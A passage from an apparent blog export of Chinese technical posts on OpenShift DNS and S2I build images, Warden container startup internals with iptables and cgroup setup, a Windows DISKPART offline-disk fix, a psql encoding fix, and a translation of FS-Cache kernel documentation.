devops**.**inspur**.** root**.**devops**.**inspur**. (** </span><br><span class="line"></span><br><span class="line">                              **3**         **;** Serial </span><br><span class="line"></span><br><span class="line">                         **604800**         **;** Refresh </span><br><span class="line"></span><br><span class="line">                          **86400**         **;** Retry  </span><br><span class="line"></span><br><span class="line">                        **2419200**         **;** Expire </span><br><span class="line"></span><br><span class="line">                         **604800** **)       ;** Negative Cache TTL </span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">@       IN      NS      devops**.**inspur**.** </span><br><span class="line"></span><br><span class="line">@       IN      A       **10.110.17.131**</span><br><span class="line"></span><br><span class="line">**\*.**devops**.**inspur**.**  **14400**   IN      A       **10.110.17.131**</span><br><span class="line"></span><br><span class="line">root@origin**\-**dns**:&#x2F;**etc**&#x2F;**bind# cat db.17.110.10</span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">**;** BIND reverse data file for dev domains </span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">$TTL    **604800** </span><br><span class="line"></span><br><span class="line">@       IN      SOA     dev**.** root**.**dev**. (** </span><br><span class="line"></span><br><span class="line">                              **3**         **;** Serial </span><br><span class="line"></span><br><span class="line">                         **604800**         **;** Refresh </span><br><span class="line"></span><br><span class="line">                          **86400**         **;** Retry </span><br><span class="line"></span><br><span class="line">                        **2419200**         **;** Expire </span><br><span class="line"></span><br><span class="line">                         **604800** **)       ;** Negative Cache TTL </span><br><span class="line"></span><br><span class="line">**;** </span><br><span class="line"></span><br><span class="line">@        IN      NS      devops**.**inspur**.** </span><br><span class="line"></span><br><span class="line">**149**      IN      PTR     devops**.**inspur**.**</span><br></pre></td></tr></table></figure>

<p>获取部署的应用对应的Router</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**\[**root@origin**\-**master image-streams**\]**\# oc get route **\-**n demo</span><br><span class="line"></span><br><span class="line">NAME               HOST**&#x2F;**PORT                            PATH      SERVICE            LABELS                      INSECURE POLICY   TLS TERMINATION</span><br><span class="line"></span><br><span class="line">django-psql-test   www**.**django-psql-test**.**devops**.**inspur             django-psql-test   template**\&#x3D;**django-psql-test</span><br></pre></td></tr></table></figure>
<p>windows或者linux配置dns地址就可以访问该应用</p>
<h2 id="S2I"><a href="#S2I" class="headerlink" title="S2I"></a>S2I</h2><p>参考（<a href="https://github.com/openshift/source-to-image%EF%BC%89" target="_blank" rel="noopener">https://github.com/openshift/source-to-image）</a></p>
<p>简单了解了S2I的思路，类似CloudFoundry的BuildPack，S2I基于build image+source code，使用脚本将源码打入build image，作为应用的docker image。这里的build image 类似CloudFoundry的buildpack，build image里面内置了应用的运行环境例如tomcat、jre、nginx</p>
<p>例如运行python程序的buil image</p>
<p><a href="https://github.com/openshift/sti-python/tree/master/2.7" target="_blank" rel="noopener">https://github.com/openshift/sti-python/tree/master/2.7</a></p>
<p><img src="file://C:/Users/wangd/AppData/Local/Temp/msohtmlclip1/01/clip_image005.jpg"></p>
<p>制作Build Image的dockerFile：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM openshift**&#x2F;**base-centos7</span><br><span class="line"></span><br><span class="line">\# This image provides a Python **2.7** environment you can use to run your Python</span><br><span class="line"></span><br><span class="line">\# applications**.**</span><br><span class="line"></span><br><span class="line">MAINTAINER SoftwareCollections**.**org **&lt;**sclorg@redhat**.**com**\&gt;**</span><br><span class="line"></span><br><span class="line">EXPOSE **8080**</span><br><span class="line"></span><br><span class="line">ENV PYTHON\_VERSION**\&#x3D;****2.7** \\</span><br><span class="line"></span><br><span class="line">    PATH**\&#x3D;**$HOME**&#x2F;.**local**&#x2F;**bin**&#x2F;:**$PATH</span><br><span class="line"></span><br><span class="line">LABEL io**.**k8s**.****description****\&#x3D;**&quot;Platform for building and running Python 2.7 applications&quot; \\</span><br><span class="line"></span><br><span class="line">      io**.**k8s**.**display-name**\&#x3D;**&quot;Python 2.7&quot; \\</span><br><span class="line"></span><br><span class="line">      io**.**openshift**.**expose-services**\&#x3D;**&quot;8080:http&quot; \\</span><br><span class="line"></span><br><span class="line">      io**.**openshift**.**tags**\&#x3D;**&quot;builder,python,python27,rh-python27&quot;</span><br><span class="line"></span><br><span class="line">RUN yum install **\-**y centos-release-scl **&amp;&amp;** \\</span><br><span class="line"></span><br><span class="line">    yum install **\-**y **\--**setopt**\&#x3D;**tsflags**\&#x3D;**nodocs **\--**enablerepo**\&#x3D;**centosplus python27 python27-python-devel python27-python-setuptools python27-python-pip epel-release **&amp;&amp;** \\</span><br><span class="line"></span><br><span class="line">    yum install **\-**y **\--**setopt**\&#x3D;**tsflags**\&#x3D;**nodocs install nss\_wrapper **&amp;&amp;** \\</span><br><span class="line"></span><br><span class="line">    yum clean all **\-**y</span><br><span class="line"></span><br><span class="line">\# Copy the S2I scripts from the specific language image to $STI\_SCRIPTS\_PATH</span><br><span class="line"></span><br><span class="line">COPY **.&#x2F;**s2i**&#x2F;**bin**&#x2F;** $STI\_SCRIPTS\_PATH</span><br><span class="line"></span><br><span class="line">\# Each language image can have &#39;contrib&#39; a directory with extra files needed to</span><br><span class="line"></span><br><span class="line">\# run and build the applications**.**</span><br><span class="line"></span><br><span class="line">COPY **.&#x2F;**contrib**&#x2F; &#x2F;**opt**&#x2F;**app-root</span><br><span class="line"></span><br><span class="line">RUN chown **\-**R **1001:0** **&#x2F;**opt**&#x2F;**app-root **&amp;&amp;** chmod **\-**R og**+**rwx **&#x2F;**opt**&#x2F;**app-root</span><br><span class="line"></span><br><span class="line">USER **1001**</span><br><span class="line"></span><br><span class="line">\# Set the **default** CMD to print the usage of the language image</span><br><span class="line"></span><br><span class="line">CMD $STI\_SCRIPTS\_PATH**&#x2F;**usage</span><br></pre></td></tr></table></figure>
<p>不同开发环境需要提供不同的build image，如果同一开发环境下，应用对运行环境需求不同，也需要开发不同的build image。</p>
<p>S2I 虽然简化了应用部署的流程，但是增加了更多的定制化过程。</p>
<p>建议使用场景：平台提供固定的几种build image。</p>
]]></content>
  </entry>
  <entry>
    <title>WiWarden启动源码分析</title>
    <url>/2020/09/15/WiWarden%E5%90%AF%E5%8A%A8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>今天研究warden的源码，分析了启动流程，整理了一下。</p>
<p>Warden 启动入口:src\warden\warden\lib\warden\server.rb  def self.run!</p>
<p>  （1）Process.setrlimit(Process::RLIMIT_NOFILE, 32768):linux 内核资源限制，一个进程能够打开的最大文件数</p>
<p>  （2）container_klass.setup(self.config)  调用src\warden\warden\lib\warden\container\linux.rb setup</p>
<p>  （3）执行脚本\src\warden\warden\root\linux\setup.sh</p>
<p>  （4） cgroup 控制</p>
<p>           （4.1）创建 /tmp/warden/cgroup</p>
<p>           （4.2）mount -t tmpfs none /tmp/warden/cgroup   创建虚拟文件系统（存储的内容在RM或者Swap空间）</p>
<p>            (4.3)  挂载cgroup子系统</p>
<p>                     none /tmp/warden/cgroup/cpu cgroup rw,relatime,cpu 0 0</p>
<p>                     none /tmp/warden/cgroup/cpuacct cgroup rw,relatime,cpuacct 0 0</p>
<p>                     none /tmp/warden/cgroup/devices cgroup rw,relatime,devices 0 0</p>
<p>                     none /tmp/warden/cgroup/memory cgroup rw,relatime,memory 0 0</p>
<p>   Cgroup子系统作用介绍</p>
<p>   blkio : 这个子系统设置限制每个块设备的输入输出控制。例如:磁盘，光盘以及usb等等。</p>
<p>   cpu  : 这个子系统使用调度程序为cgroup任务提供cpu的访问。</p>
<p>   cpuacct : 产生cgroup任务的cpu资源报告。</p>
<p>   cpuset : 如果是多核心的cpu，这个子系统会为cgroup任务分配单独的cpu和内存。</p>
<p>   devices : 允许或拒绝cgroup任务对设备的访问。</p>
<p>   freezer : 暂停和恢复cgroup任务。</p>
<p>   memory : 设置每个cgroup的内存限制以及产生内存资源报告。</p>
<p>   net_cls : 标记每个网络包以供cgroup方便使用。</p>
<p>   ns    :   名称空间子系统。</p>
<p>   perf_event:   增加了对每group的监测跟踪的能力，即可以监测属于某个特定的group的所有线程以及运行在特定CPU上的线程，此功能对于监测整个group非常有用</p>
<p>（5） <!--\[endif\]-->网络配置，执行脚本src\warden\warden\root\linux\net.sh</p>
<p>           （5.1）setup_filter: </p>
<p>               iptables -N warden-forward 2&gt; /dev/null || iptables -F warden-forward</p>
<p>               iptables -A warden-forward -j DROP   </p>
<p>                     创建过滤链，增加过滤规则（丢弃封包不予处理，进行完此处理动作后，将不再比对其它规则，直接中断过滤程序）</p>
<p>              iptables -N warden-default 2&gt; /dev/null || iptables -F warden-default</p>
<p>                创建默认过滤链</p>
<p>              iptables -A warden-default -m conntrack –ctstate ESTABLISHED,RELATED -j ACCEPT</p>
<p>                默认过滤链增加规则，允许已经建立的连接到containers</p>
<p>              iptables -A warden-default –destination “$n” –jump RETURN</p>
<p>              iptables -A warden-default –destination “$n” –jump DROP</p>
<p>                设置配置文件中配置的 被允许的网络，以及被禁止的网络</p>
<p>              iptables -A FORWARD -i w-+ –jump warden-forward</p>
<p>                     配置outbound traffic</p>
<p>             default_interface=$(ip route show | grep default | cut -d’ ‘ -f5 | head -1)</p>
<p>             iptables -I warden-forward -i $default_interface –jump ACCEPT</p>
<p>                设置使用的网卡接口 设置inround traffic</p>
<p>    (5.2)setup_nat</p>
<p>        iptables -t nat -N warden-prerouting 2&gt; /dev/null || true</p>
<p>            新建一个 nat规则表</p>
<p>      (iptables -t nat -S PREROUTING | grep -q “\-j warden-prerouting\b”) ||</p>
<p>      iptables -t nat -A PREROUTING \</p>
<p>      –jump warden-prerouting</p>
<p>     检查是否存在nat的prerouting 规则链 与warden-prerouting 绑定，如果没有将warden-prerouting  绑定到nat的prerouting规则链。</p>
<p>    (iptables -t nat -S OUTPUT | grep -q “\-j warden-prerouting\b”) ||</p>
<p>    iptables -t nat -A OUTPUT \</p>
<p>      –out-interface “lo” \</p>
<p>      –jump warden-prerouting</p>
<p>  Bind chain to OUTPUT (for traffic originating from same host)</p>
<p>  # Create postrouting chain</p>
<p>  iptables -t nat -N ${nat_postrouting_chain} 2&gt; /dev/null || true</p>
<p>  # Bind chain to POSTROUTING</p>
<p>  (iptables -t nat -S POSTROUTING | grep -q “\-j ${nat_postrouting_chain}\b”) ||</p>
<p>    iptables -t nat -A POSTROUTING \</p>
<p>      –jump ${nat_postrouting_chain}</p>
<p>  # Enable NAT for traffic coming from containers</p>
<p>  (iptables -t nat -S ${nat_postrouting_chain} | grep -q “\-j SNAT\b”) ||</p>
<p>    iptables -t nat -A ${nat_postrouting_chain} \</p>
<p>      –source ${POOL_NETWORK} \</p>
<p>      –jump SNAT \</p>
<p>      –to $(external_ip)</p>
<p> （6） 关闭AppArmor</p>
<p> （7） 设置warden的配额</p>
<p>        配置文件设置了quota:</p>
<p>                          disk_quota_enabled: true</p>
<p>         并且存放container的目录（/tmp/warden/containers）开启了配额管理</p>
<p>           mount -o remount,usrjquota=aquota.user,grpjquota=aquota.group,jqfmt=vfsv0 $CONTAINER_DEPOT_MOUNT_POINT_PATH</p>
<!--\[if !supportLists\]--> (8)<!--\[endif\]-->回到 src\\warden\\warden\\lib\\warden\\server.rb 执行：recover\_containers

<p>   检查 /tmp/warden/containers 的container 状态</p>
<p>       （1）将死去的container删除（destroy.sh）</p>
<p>       （2）将仍然存活的container 启动(根据snapshot.json 中的信息恢复)</p>
<!--\[if !supportLists\]-->（9） <!--\[endif\]-->启动warden 进程

<p>        FileUtils.rm_f(unix_domain_path)</p>
<p>          server = ::EM.start_unix_domain_server(unix_domain_path, ClientConnection)</p>
<p>          ::EM.start_server(“127.0.0.1”, config.health_check_server[“port”],HealthCheck)</p>
<p>（10）</p>
<p>    @drainer = Drainer.new(server, “USR2”)</p>
<p>    @drainer.on_complete do</p>
<p>            Fiber.new do</p>
<p>              logger.info(“Drain complete”)</p>
<p>              # Serialize container state</p>
<p>              container_klass.registry.each { |_, c| c.write_snapshot }</p>
<p>              EM.stop</p>
<p>            end.resume</p>
<p>          End</p>
<p>   目前还不清楚是做什么。</p>
<p>（11） </p>
<p>          FileUtils.chmod(unix_domain_permissions, unix_domain_path)</p>
<p>          修改/tmp/warden.sock 文件属性为0777</p>
<p>          # Let the world know Warden is ready for action.</p>
<p>          logger.info(“Listening on #{unix_domain_path}”)</p>
<p>          if pidfile = config.server[“pidfile”]</p>
<p>            logger.info(“Writing pid #{Process.pid} to #{pidfile}”)</p>
<p>            PidFile.new(piddir: File.dirname(pidfile), pidfile: File.basename(pidfile))</p>
<p>          end</p>
]]></content>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title>Win 208 R2——由于管理员设置的策略，该磁盘处于脱机状态</title>
    <url>/2020/09/15/Win-208-R2%E2%80%94%E2%80%94%E7%94%B1%E4%BA%8E%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%AD%96%E7%95%A5%EF%BC%8C%E8%AF%A5%E7%A3%81%E7%9B%98%E5%A4%84%E4%BA%8E%E8%84%B1%E6%9C%BA%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<p>1.原系统为Windows 2012挂载了2T的存储，因业务要求重新安装为Windows 2008R2，并没有在磁盘存储空间上重新做映射。  </p>
<p>2.系统安装完成，安装完多路径软件后，无法对挂载的分区进行操作。如下图除了删除卷和帮助其他的都是灰的。点击删除卷提示介质写入保护</p>
<p>3.鼠标指向小叹号提示由于管理员设置的策略，该磁盘处于脱机状态。</p>
<p><img src="https://images2015.cnblogs.com/blog/813376/201510/813376-20151009102500799-1326229038.jpg"></p>
<p><strong>解决方案步骤如下：</strong>  </p>
<p>使用DISKPART.exe命令 解除策略</p>
<p>1.运行：cmd</p>
<p>2.输入：DISKPART.exe搜索</p>
<p>3.DISKPART&gt; san</p>
<p>4.DISKPART&gt; san policy=onlineall</p>
<p>5.DISKPART&gt;list disk</p>
<p>6.DISKPART&gt; select disk 1</p>
<p>7.DISKPART&gt;attributes disk clear readonly</p>
<p><img src="https://images2015.cnblogs.com/blog/813376/201510/813376-20151009103049284-2075799642.jpg"></p>
<p>8.DISKPART&gt;online disk</p>
<p><img src="https://images2015.cnblogs.com/blog/813376/201510/813376-20151009103227471-1421585187.jpg"></p>
<p>NOW！就可以对硬盘进行分区了操作了</p>
<p><img src="https://images2015.cnblogs.com/blog/813376/201510/813376-20151009103346049-1965641745.jpg"></p>
]]></content>
  </entry>
  <entry>
    <title>Window导入postgres的sql文件的encoding 错误</title>
    <url>/2020/09/15/Window%E5%AF%BC%E5%85%A5postgres%E7%9A%84sql%E6%96%87%E4%BB%B6%E7%9A%84encoding-%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>postgres的windows客户端使用pgadmin，pgadmin没有直接导入sql的操作，需要命令行导入，在windows的命令行执行导入命令，会报以下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">character with byte sequence 0xc2 0x90 in encoding GBK has no </span><br><span class="line">equivalent in encodeing utf8</span><br></pre></td></tr></table></figure>
<p>出现这种错误的原因，通常是psql的客户端编码与服务端的编码不一致导致的，可以使用以下操作，解决编码问题`</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -u postgres -p 5432 -d slip -h 10.10.70.58</span><br><span class="line">slip&#x3D;#encoding UTF8;</span><br><span class="line">slip&#x3D;# \i &#39;c:&#x2F;public.sql&#39;;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>cachefilesd缓存项目介绍</title>
    <url>/2021/02/19/cachefilesd%E7%BC%93%E5%AD%98%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>原文引自<a href="https://www.kernel.org/doc/html/latest/filesystems/caching/cachefiles.html" target="_blank" rel="noopener">这里</a></p>
<h2 id="FS-Cache"><a href="#FS-Cache" class="headerlink" title="FS Cache"></a>FS Cache</h2><p>FS-Cache是一种内核功能，网络文件系统或其他文件系统可以通过它来缓存数据到本地磁盘空间，减少网络传输的数据，从而提升性能。这在网络速度比较慢时会得到比较好的效果。</p>
<p>FS-Cache 可以被任何希望添加本地缓存的文件系统使用，例如：AFS、NFS、CIFS和Isofs。</p>
<p>FS-Cache 对于客户端文件系统是透明存在的，当这项功能开启的时候，透过缓存请求文件对于客户端是无感知的。可以参考下图，FS-Cache可以认为是网络文件系统和缓存后端的中间介质:<br><img src="/2021/02/19/cachefilesd%E7%BC%93%E5%AD%98%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/1.png" alt="avatar"></p>
<p>看一个更详细的图，FS-Cache为网络文件系统提供了一个缓存工具，从而让缓存对用户无感知<br><img src="/2021/02/19/cachefilesd%E7%BC%93%E5%AD%98%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/2.png" alt="avatar"></p>
<p>FS-Cache并不遵循在允许访问之前将所有完全打开的每个netfs文件完全加载到高速缓存中，主要有以下几个原因：</p>
<ol>
<li>没有Cache 也应该能够正常操作</li>
<li>被访问的文件的大小不应该受限于Cache的空间大小</li>
<li>所有已经打开的文件大小不应该受限于Cache的空间大小</li>
<li>不应该强制用户为了一个文件操作（访问文件的一小部分）将整个文件全部进行下载缓存</li>
</ol>
<p>FS-Cache提供的能力如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. More than one cache can be used at once. Caches can be selected explicitly by use of tags. 一次可以使用多个Cache，不同的Cache使用不同的tag区分</span><br><span class="line">2. Caches can be added &#x2F; removed at any time. Cache可以在任何时间被移除或者添加</span><br><span class="line">3. The netfs is provided with an interface that allows either party to withdraw caching facilities from a file (required for (2)). 网络文件系统提供接口，能够允许其他方删除文件cache相关的能力</span><br><span class="line">4. The interface to the netfs returns as few errors as possible, preferring rather to let the netfs remain oblivious. 网络文件系统尽量不要返回错误</span><br><span class="line">5. Cookies are used to represent indices, files and other objects to the netfs. The simplest cookie is just a NULL pointer - indicating nothing cached there. 使用cookie表示文件系统的目录、文件、其他对象</span><br><span class="line">6. The netfs is allowed to propose - dynamically - any index hierarchy it desires, though it must be aware that the index search function is recursive, stack space is limited, and indices can only be children of indices.</span><br><span class="line">7. Data I&#x2F;O is done direct to and from the netfs’s pages. The netfs indicates that page A is at index B of the data-file represented by cookie C, and that it should be read or written. The cache backend may or may not start I&#x2F;O on that page, but if it does, a netfs callback will be invoked to indicate completion. The I&#x2F;O may be either synchronous or asynchronous.</span><br><span class="line">8. Cookies can be “retired” upon release. At this point FS-Cache will mark them as obsolete and the index hierarchy rooted at that point will get recycled.</span><br><span class="line">9. The netfs provides a “match” function for index searches. In addition to saying whether a match was made or not, this can also specify that an entry should be updated or deleted.</span><br><span class="line">10. As much as possible is done asynchronously.</span><br></pre></td></tr></table></figure>

<p>FS-Cache维护了一个网络文件系统数据的全部索引，该信息可以位于一个或者多个cache中，如下图所示：</p>
<p><img src="/2021/02/19/cachefilesd%E7%BC%93%E5%AD%98%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/3.png" alt="avatar"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In the example above, you can see two netfs’s being backed: NFS and AFS. These have different index hierarchies:</span><br><span class="line"></span><br><span class="line">* The NFS primary index contains per-server indices. Each server index is indexed by NFS file handles to get data file objects. Each data file objects can have an array of pages, but may also have further child objects, such as extended attributes and directory entries. Extended attribute objects themselves have page-array contents.</span><br><span class="line">* The AFS primary index contains per-cell indices. Each cell index contains per-logical-volume indices. Each of volume index contains up to three indices for the read-write, read-only and backup mirrors of those volumes. Each of these contains vnode data file objects, each of which contains an array of pages.</span><br></pre></td></tr></table></figure>
<h2 id="Kernel-内部的Cache-管理"><a href="#Kernel-内部的Cache-管理" class="headerlink" title="Kernel 内部的Cache 管理"></a>Kernel 内部的Cache 管理</h2><p>FS-Cache维护类内核形态的网络文件感兴趣的对象，这些对象使用fscache_cookie 结构体来表示，以cookie的方式被引用。</p>
<p>FS-Cache 也单独维护了内核形态的 缓存后端正在使用的对象cache</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FS-Cache maintains an in-kernel representation of each object that a netfs is currently interested in. Such objects are represented by the fscache_cookie struct and are referred to as cookies.</span><br><span class="line"></span><br><span class="line">FS-Cache also maintains a separate in-kernel representation of the objects that a cache backend is currently actively caching. Such objects are represented by the fscache_object struct. The cache backends allocate these upon request, and are expected to embed them in their own representations. These are referred to as objects.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">There is a 1:N relationship between cookies and objects. A cookie may be represented by multiple objects - an index may exist in more than one cache - or even by no objects (it may not be cached).</span><br><span class="line"></span><br><span class="line">Furthermore, both cookies and objects are hierarchical. The two hierarchies correspond, but the cookies tree is a superset of the union of the object trees of multiple caches:</span><br><span class="line"></span><br><span class="line">    NETFS INDEX TREE               :      CACHE 1     :      CACHE 2</span><br><span class="line">                                   :                  :</span><br><span class="line">                                   :   +-----------+  :</span><br><span class="line">                          +-----------&gt;|  IObject  |  :</span><br><span class="line">      +-----------+       |        :   +-----------+  :</span><br><span class="line">      |  ICookie  |-------+        :         |        :</span><br><span class="line">      +-----------+       |        :         |        :   +-----------+</span><br><span class="line">            |             +------------------------------&gt;|  IObject  |</span><br><span class="line">            |                      :         |        :   +-----------+</span><br><span class="line">            |                      :         V        :         |</span><br><span class="line">            |                      :   +-----------+  :         |</span><br><span class="line">            V             +-----------&gt;|  IObject  |  :         |</span><br><span class="line">      +-----------+       |        :   +-----------+  :         |</span><br><span class="line">      |  ICookie  |-------+        :         |        :         V</span><br><span class="line">      +-----------+       |        :         |        :   +-----------+</span><br><span class="line">            |             +------------------------------&gt;|  IObject  |</span><br><span class="line">      +-----+-----+                :         |        :   +-----------+</span><br><span class="line">      |           |                :         |        :         |</span><br><span class="line">      V           |                :         V        :         |</span><br><span class="line">+-----------+     |                :   +-----------+  :         |</span><br><span class="line">|  ICookie  |-------------------------&gt;|  IObject  |  :         |</span><br><span class="line">+-----------+     |                :   +-----------+  :         |</span><br><span class="line">      |           V                :         |        :         V</span><br><span class="line">      |     +-----------+          :         |        :   +-----------+</span><br><span class="line">      |     |  ICookie  |--------------------------------&gt;|  IObject  |</span><br><span class="line">      |     +-----------+          :         |        :   +-----------+</span><br><span class="line">      V           |                :         V        :         |</span><br><span class="line">+-----------+     |                :   +-----------+  :         |</span><br><span class="line">|  DCookie  |-------------------------&gt;|  DObject  |  :         |</span><br><span class="line">+-----------+     |                :   +-----------+  :         |</span><br><span class="line">                  |                :                  :         |</span><br><span class="line">          +-------+-------+        :                  :         |</span><br><span class="line">          |               |        :                  :         |</span><br><span class="line">          V               V        :                  :         V</span><br><span class="line">    +-----------+   +-----------+  :                  :   +-----------+</span><br><span class="line">    |  DCookie  |   |  DCookie  |------------------------&gt;|  DObject  |</span><br><span class="line">    +-----------+   +-----------+  :                  :   +-----------+</span><br><span class="line">                                   :                  :</span><br><span class="line">In the above illustration, ICookie and IObject represent indices and DCookie and DObject represent data storage objects. Indices may have representation in multiple caches, but currently, non-index objects may not. Objects of any type may also be entirely unrepresented.</span><br><span class="line"></span><br><span class="line">As far as the netfs API goes, the netfs is only actually permitted to see pointers to the cookies. The cookies themselves and any objects attached to those cookies are hidden from it.</span><br></pre></td></tr></table></figure>

<h2 id="对象管理状态机"><a href="#对象管理状态机" class="headerlink" title="对象管理状态机"></a>对象管理状态机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Within FS-Cache, each active object is managed by its own individual state machine. The state for an object is kept in the fscache_object struct, in object-&gt;state. A cookie may point to a set of objects that are in different states.</span><br><span class="line"></span><br><span class="line">Each state has an action associated with it that is invoked when the machine wakes up in that state. There are four logical sets of states:</span><br><span class="line"></span><br><span class="line">* Preparation: states that wait for the parent objects to become ready. The representations are hierarchical, and it is expected that an object must be created or accessed with respect to its parent object.</span><br><span class="line">* Initialisation: states that perform lookups in the cache and validate what’s found and that create on disk any missing metadata.</span><br><span class="line">* Normal running: states that allow netfs operations on objects to proceed and that update the state of objects.</span><br><span class="line">*  Termination: states that detach objects from their netfs cookies, that delete objects from disk, that handle disk and system errors and that free up in-memory resources.</span><br><span class="line">  </span><br><span class="line">In most cases, transitioning between states is in response to signalled events. When a state has finished processing, it will usually set the mask of events in which it is interested (object-&gt;event_mask) and relinquish the worker thread. Then when an event is raised (by calling fscache_raise_event()), if the event is not masked, the object will be queued for processing (by calling fscache_enqueue_object()).</span><br></pre></td></tr></table></figure>

<h2 id="Provision-of-CPU-Time"><a href="#Provision-of-CPU-Time" class="headerlink" title="Provision of CPU Time"></a>Provision of CPU Time</h2><p>The work to be done by the various states was given CPU time by the threads of the slow work facility. This was used in preference to the workqueue facility because:</p>
<p>Threads may be completely occupied for very long periods of time by a particular work item. These state actions may be doing sequences of synchronous, journalled disk accesses (lookup, mkdir, create, setxattr, getxattr, truncate, unlink, rmdir, rename).</p>
<p>Threads may do little actual work, but may rather spend a lot of time sleeping on I/O. This means that single-threaded and 1-per-CPU-threaded workqueues don’t necessarily have the right numbers of threads.</p>
<h2 id="Locking-Simplification"><a href="#Locking-Simplification" class="headerlink" title="Locking Simplification"></a>Locking Simplification</h2><p>Because only one worker thread may be operating on any particular object’s state machine at once, this simplifies the locking, particularly with respect to disconnecting the netfs’s representation of a cache object (fscache_cookie) from the cache backend’s representation (fscache_object) - which may be requested from either end.</p>
<h2 id="状态集合"><a href="#状态集合" class="headerlink" title="状态集合"></a>状态集合</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Set of States</span><br><span class="line">The object state machine has a set of states that it can be in. There are preparation states in which the object sets itself up and waits for its parent object to transit to a state that allows access to its children:</span><br><span class="line"></span><br><span class="line">1. State FSCACHE_OBJECT_INIT.</span><br><span class="line"></span><br><span class="line">Initialise the object and wait for the parent object to become active. In the cache, it is expected that it will not be possible to look an object up from the parent object, until that parent object itself has been looked up.</span><br><span class="line"></span><br><span class="line">There are initialisation states in which the object sets itself up and accesses disk for the object metadata:</span><br><span class="line"></span><br><span class="line">2. State FSCACHE_OBJECT_LOOKING_UP.</span><br><span class="line"></span><br><span class="line">Look up the object on disk, using the parent as a starting point. FS-Cache expects the cache backend to probe the cache to see whether this object is represented there, and if it is, to see if it’s valid (coherency management).</span><br><span class="line"></span><br><span class="line">The cache should call fscache_object_lookup_negative() to indicate lookup failure for whatever reason, and should call fscache_obtained_object() to indicate success.</span><br><span class="line"></span><br><span class="line">At the completion of lookup, FS-Cache will let the netfs go ahead with read operations, no matter whether the file is yet cached. If not yet cached, read operations will be immediately rejected with ENODATA until the first known page is uncached - as to that point there can be no data to be read out of the cache for that file that isn’t currently also held in the pagecache.</span><br><span class="line"></span><br><span class="line">3. State FSCACHE_OBJECT_CREATING.</span><br><span class="line"></span><br><span class="line">Create an object on disk, using the parent as a starting point. This happens if the lookup failed to find the object, or if the object’s coherency data indicated what’s on disk is out of date. In this state, FS-Cache expects the cache to create</span><br><span class="line"></span><br><span class="line">The cache should call fscache_obtained_object() if creation completes successfully, fscache_object_lookup_negative() otherwise.</span><br><span class="line"></span><br><span class="line">At the completion of creation, FS-Cache will start processing write operations the netfs has queued for an object. If creation failed, the write ops will be transparently discarded, and nothing recorded in the cache.</span><br><span class="line"></span><br><span class="line">There are some normal running states in which the object spends its time servicing netfs requests:</span><br><span class="line"></span><br><span class="line">4. State FSCACHE_OBJECT_AVAILABLE.</span><br><span class="line"></span><br><span class="line">A transient state in which pending operations are started, child objects are permitted to advance from FSCACHE_OBJECT_INIT state, and temporary lookup data is freed.</span><br><span class="line"></span><br><span class="line">5. State FSCACHE_OBJECT_ACTIVE.</span><br><span class="line"></span><br><span class="line">The normal running state. In this state, requests the netfs makes will be passed on to the cache.</span><br><span class="line"></span><br><span class="line">6. State FSCACHE_OBJECT_INVALIDATING.</span><br><span class="line"></span><br><span class="line">The object is undergoing invalidation. When the state comes here, it discards all pending read, write and attribute change operations as it is going to clear out the cache entirely and reinitialise it. It will then continue to the FSCACHE_OBJECT_UPDATING state.</span><br><span class="line"></span><br><span class="line">7. State FSCACHE_OBJECT_UPDATING.</span><br><span class="line"></span><br><span class="line">The state machine comes here to update the object in the cache from the netfs’s records. This involves updating the auxiliary data that is used to maintain coherency.</span><br><span class="line"></span><br><span class="line">And there are terminal states in which an object cleans itself up, deallocates memory and potentially deletes stuff from disk:</span><br><span class="line"></span><br><span class="line">8. State FSCACHE_OBJECT_LC_DYING.</span><br><span class="line"></span><br><span class="line">The object comes here if it is dying because of a lookup or creation error. This would be due to a disk error or system error of some sort. Temporary data is cleaned up, and the parent is released.</span><br><span class="line"></span><br><span class="line">9. State FSCACHE_OBJECT_DYING.</span><br><span class="line"></span><br><span class="line">The object comes here if it is dying due to an error, because its parent cookie has been relinquished by the netfs or because the cache is being withdrawn.</span><br><span class="line"></span><br><span class="line">Any child objects waiting on this one are given CPU time so that they too can destroy themselves. This object waits for all its children to go away before advancing to the next state.</span><br><span class="line"></span><br><span class="line">10. State FSCACHE_OBJECT_ABORT_INIT.</span><br><span class="line"></span><br><span class="line">The object comes to this state if it was waiting on its parent in FSCACHE_OBJECT_INIT, but its parent died. The object will destroy itself so that the parent may proceed from the FSCACHE_OBJECT_DYING state.</span><br><span class="line"></span><br><span class="line">11. State FSCACHE_OBJECT_RELEASING.</span><br><span class="line"></span><br><span class="line">12. State FSCACHE_OBJECT_RECYCLING.</span><br><span class="line"></span><br><span class="line">The object comes to one of these two states when dying once it is rid of all its children, if it is dying because the netfs relinquished its cookie. In the first state, the cached data is expected to persist, and in the second it will be deleted.</span><br><span class="line"></span><br><span class="line">13. State FSCACHE_OBJECT_WITHDRAWING.</span><br><span class="line"></span><br><span class="line">The object transits 